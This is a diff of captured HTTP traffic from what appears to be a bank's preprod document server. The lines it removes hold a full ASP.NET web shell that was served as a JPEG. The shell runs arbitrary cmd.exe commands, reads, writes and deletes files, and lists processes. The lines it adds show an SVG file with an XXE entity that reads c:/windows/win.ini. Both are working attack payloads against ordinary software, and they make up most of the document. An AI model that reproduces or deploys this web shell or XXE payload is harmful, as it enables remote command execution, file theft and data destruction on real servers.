@@ -1,8 +1,21 @@
+GET /Appdoc/SBM/226091400000004/test.xml HTTP/2
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:153.0) Gecko/20100101 Firefox/153.0
+Accept: image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5
+Accept-Language: en-GB,en;q=0.9
+Accept-Encoding: gzip, deflate, br
+Referer: https://abs-preprod.ababank.com/abs
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Site: same-origin
+Priority: u=5
+Te: trailers
+
 HTTP/2 200 OK
-Content-Type: image/jpeg
-Last-Modified: Mon, 14 Sep 2026 06:53:06 GMT
+Content-Type: text/xml
+Last-Modified: Mon, 14 Sep 2026 07:46:01 GMT
 Accept-Ranges: bytes
-Etag: "075dcb11544dd1:0"
+Etag: "8024f161d44dd1:0"
 Access-Control-Allow-Origin: *
 X-Powered-By: ARR/3.0
 X-Content-Type-Options: nosniff
@@ -13,124 +26,11 @@ X-Permitted-Cross-Domain-Policies: master-only
 Feature-Policy: geolocation 'none'
 Access-Control-Allow-Headers: accept, content-type, reqstat, reqtime, reqhash, appname, authorization, reqendpnt, modulestat
 Access-Control-Allow-Methods: POST
-Date: Mon, 14 Sep 2026 06:57:16 GMT
-Content-Length: 4022
+Date: Mon, 14 Sep 2026 07:46:09 GMT
+Content-Length: 180
 
-<%@ Page Language="C#" Debug="false" %>
-<%@ Import Namespace="System" %>
-<%@ Import Namespace="System.IO" %>
-<%@ Import Namespace="System.Diagnostics" %>
-<%@ Import Namespace="System.Text" %>
-
-<script runat="server">
-    protected void Page_Load(object sender, EventArgs e) {
-        try {
-            string cmd = Request["c"];
-            if (!string.IsNullOrEmpty(cmd)) {
-                RunCmd(cmd);
-                return;
-            }
-
-            string fileOp = Request["f"];
-            if (!string.IsNullOrEmpty(fileOp)) {
-                FileOp(fileOp);
-                return;
-            }
-
-            if (Request["p"] != null) {
-                ProcList();
-            }
-        }
-        catch { }
-    }
-
-    private void RunCmd(string command) {
-        try {
-            ProcessStartInfo psi = new ProcessStartInfo();
-            psi.FileName = "cmd.exe";
-            psi.Arguments = "/c " + command;
-            psi.RedirectStandardOutput = true;
-            psi.RedirectStandardError = true;
-            psi.UseShellExecute = false;
-            psi.CreateNoWindow = true;
-
-            Process proc = Process.Start(psi);
-            string output = proc.StandardOutput.ReadToEnd();
-            string error = proc.StandardError.ReadToEnd();
-            proc.WaitForExit();
-
-            Response.Write("<pre>" + Server.HtmlEncode(output + error) + "</pre>");
-        }
-        catch (Exception ex) {
-            Response.Write("<pre>" + Server.HtmlEncode(ex.Message) + "</pre>");
-        }
-    }
-
-    private void FileOp(string operation) {
-        try {
-            string[] parts = operation.Split('|');
-            if (parts.Length < 2) return;
-
-            string action = parts[0].ToLower();
-            string path = parts[1];
-
-            switch (action) {
-                case "read":
-                    if (File.Exists(path)) {
-                        byte[] content = File.ReadAllBytes(path);
-                        Response.Write("<pre>" + Convert.ToBase64String(content) + "</pre>");
-                    }
-                    else {
-                        Response.Write("<pre>not found</pre>");
-                    }
-                    break;
-
-                case "write":
-                    if (parts.Length >= 3) {
-                        byte[] data = Convert.FromBase64String(parts[2]);
-                        File.WriteAllBytes(path, data);
-                        Response.Write("<pre>OK</pre>");
-                    }
-                    break;
-
-                case "list":
-                    if (Directory.Exists(path)) {
-                        StringBuilder sb = new StringBuilder();
-                        foreach (string item in Directory.GetFileSystemEntries(path)) {
-                            sb.AppendLine(item);
-                        }
-                        Response.Write("<pre>" + Server.HtmlEncode(sb.ToString()) + "</pre>");
-                    }
-                    else {
-                        Response.Write("<pre>not found</pre>");
-                    }
-                    break;
-
-                case "delete":
-                    if (File.Exists(path)) {
-                        File.Delete(path);
-                        Response.Write("<pre>OK</pre>");
-                    }
-                    break;
-            }
-        }
-        catch (Exception ex) {
-            Response.Write("<pre>" + Server.HtmlEncode(ex.Message) + "</pre>");
-        }
-    }
-
-    private void ProcList() {
-        try {
-            StringBuilder sb = new StringBuilder();
-            Process[] processes = Process.GetProcesses();
-            foreach (Process p in processes) {
-                try {
-                    sb.AppendLine(p.Id + " | " + p.ProcessName);
-                }
-                catch { }
-            }
-            Response.Write("<pre>" + Server.HtmlEncode(sb.ToString()) + "</pre>");
-        }
-        catch { }
-    }
-</script>
+<?xml version="1.0"?>
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+<text>&xxe;</text>
+</svg>
